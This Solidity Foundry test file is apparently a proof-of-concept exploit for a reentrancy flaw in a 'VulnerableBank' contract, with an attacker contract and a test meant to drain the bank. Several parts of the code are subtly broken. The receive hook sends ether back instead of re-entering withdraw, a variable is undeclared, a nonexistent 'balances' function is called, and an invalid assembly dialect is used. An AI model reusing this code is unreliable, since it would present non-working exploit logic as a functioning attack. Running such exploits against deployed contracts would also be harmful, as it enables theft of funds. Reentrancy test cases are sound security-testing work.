// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/59211d84-c7b9-40c4-b46b-03384be2eb91_VulnerableBank.sol";

contract ReentrancyReceiver {
    VulnerableBank private immutable target;
    uint256 private immutable amount;

    constructor(VulnerableBank target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= msg.value) { // Ensure enough balance to withdraw once
            (bool success, ) = address(target).call{value: msg.value}("");
            require(success, "Withdraw failed");
        }
    }

    function attack() external payable {
        target.deposit{value: amount}();
        // Ensure sufficient balance to trigger reentrancy
        (bool success, ) = target.call{value: amount * 2}("");
        require(success, "Deposit or call failed");

        uint256 max;
        assembly ("safe") {
            max := sub(0, 1)
        }

        target.withdraw(max);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    ReentrancyReceiver receiver;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        receiver = new ReentrancyReceiver(target);
        
        // Ensure sufficient balance for the attack
        vm.deal(attacker, 1 ether);
        vm.deal(address(target), 2 ether); 
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receiver.attack{value: amount}();

        assertGt(receiver.balances(attacker), amount * 3);
    }
}